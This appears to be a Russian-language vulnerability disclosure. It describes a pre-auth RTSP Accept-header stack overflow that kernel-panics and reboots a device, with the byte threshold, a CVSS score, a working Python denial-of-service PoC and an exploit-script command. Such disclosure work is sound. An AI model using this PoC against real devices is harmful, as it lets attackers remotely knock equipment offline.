# [AC] RTSP Accept Header — Kernel Panic

**CWE-121** · **CVSS 8.1 High** · **Pre-auth** · **Remote** · **Full Device Reboot**

---

## Краткое описание

Заголовок `Accept` в RTSP-запросе `DESCRIBE` вызывает kernel panic при значении длиной 153+ байта. Механизм аналогичен [SC]: stack overflow в обработчике значения заголовка, но переполнение затрагивает kernel-space структуру.

---

## Технические детали

### Уязвимое поле

```
Accept: application/sdp; <OVERFLOW_HERE>
```

Стандартное значение: `Accept: application/sdp`. Парсер копирует строку без проверки длины.

### Точный порог

Определён бинарным поиском:

| Длина Accept | Поведение |
|-------------|-----------|
| 152 байта | Нормальный ответ или мягкий crash |
| **153 байта** | **Kernel panic, reboot >90 сек** |
| 200+ байт | Kernel panic |

---

## Доказательство (PoC)

```python
import socket

TARGET = "█████████████"
accept = b'application/sdp; ' + b'x' * 200   # 217 байт → kernel panic
req = (b"DESCRIBE rtsp://█████████████:554/live RTSP/1.0\r\n"
       b"CSeq: 1\r\n"
       b"Accept: " + accept + b"\r\n\r\n")

s = socket.socket(); s.settimeout(5)
s.connect((TARGET, 554)); s.sendall(req); s.close()
# → kernel panic → полная перезагрузка устройства
```

---

## Сравнение с [SC]

| Параметр | [AC] Accept | [SC] Scale |
|----------|-------------|------------|
| RTSP метод | DESCRIBE | PLAY |
| Порог | 153 байта | ~200 байт |
| Recovery | >90 сек | >90 сек |
| Тип краша | Kernel panic | Kernel panic |

Оба вектора дают одинаковый деструктивный эффект через разные обработчики.

---

## CVSS v3.1

```
AV:N / AC:L / PR:N / UI:N / S:C / C:N / I:N / A:H  =  8.1 High
```

---

## Эксплойт

```bash
python3 exploits/crashbandicoot.py -t █████████████ --mode dos-accept
```


---

*Co-authored with [Claude](https://claude.ai) (Anthropic)*
